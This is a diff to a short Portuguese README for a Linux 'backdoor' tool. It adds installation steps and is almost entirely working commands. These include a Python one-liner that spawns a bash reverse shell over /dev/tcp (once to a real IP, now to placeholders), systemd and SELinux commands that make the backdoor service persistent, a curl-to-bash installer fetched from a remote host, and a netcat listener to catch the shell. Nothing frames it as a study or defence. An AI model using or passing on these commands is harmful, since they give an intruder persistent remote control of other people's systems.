@@ -1,6 +1,6 @@
 # Backdoor
 
-> import os ; os.system('bash -i >& /dev/tcp/45.171.127.130/8000 0>&1')
+> import os ; os.system('bash -i >& /dev/tcp/<IP DE DESTINO>/<PORTA DE DESTINO> 0>&1')
 
 ### Selinux
 restorecon -RFv /usr/lib/systemd/system/backdoor.service
@@ -12,4 +12,11 @@ systemctl start backdoor.service
 systemctl enable backdoor.service
 
 ### Instalação
-curl -s -L http://45.171.127.130/install.sh | bash
+curl -s -L https://raw.githubusercontent.com/laurobmb/backdoor_linux/master/install.sh | bash
+
+
+## No server
+
+Para receber a conexão basta executar:
+
+> nc -nlv 8001
